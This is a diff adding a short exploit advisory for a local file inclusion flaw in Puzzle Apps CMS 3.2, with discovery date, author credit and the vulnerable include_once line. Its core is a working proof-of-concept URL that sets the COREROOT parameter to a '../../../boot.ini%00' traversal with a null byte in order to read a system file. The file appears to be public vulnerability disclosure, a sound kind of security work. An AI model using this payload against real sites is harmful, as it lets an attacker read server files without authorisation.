@@ -1,0 +1,33 @@
+# ------------------------------------------------------------------------
+# Software................ Puzzle Apps CMS 3.2
+# Vulnerability........... Local File Inclusion 
+# Site.................... http://www.puzzleapps.org/
+# Download Link........... http://sourceforge.net/projects/puzzlecms/files/puzzlecms/Puzzle Apps CMS 3.2/puzzle-3.2.tar.gz/download
+# Discovery Date.......... 5/29/2011
+# Tested On............... Windows XPsp2 + WAMP
+# ------------------------------------------------------------------------
+# Author.................. Treasure Priyamal
+# Site.................... http://www.treasuresec.com/
+# Email................... Treasure Priyamal <treasure@treasuresec.com>
+# ------------------------------------------------------------------------
+#
+#
+# --Description--
+#
+# In Puzzle App CMS there are couple of the places you will be able to find 
+# LFI vulns. 
+#
+#
+# -- Vulnerable Source
+# include_once ($COREROOT . "config/loader.config.php");
+#
+# --Sample to LFI--
+# 
+#http://localhost/puzzle/core/config.loader.php?COREROOT=[LFI]
+#
+#
+# --PoC LFI --
+#
+#http://localhost/puzzle/core/config.loader.php?COREROOT=../../../boot.ini%00
+#
+#
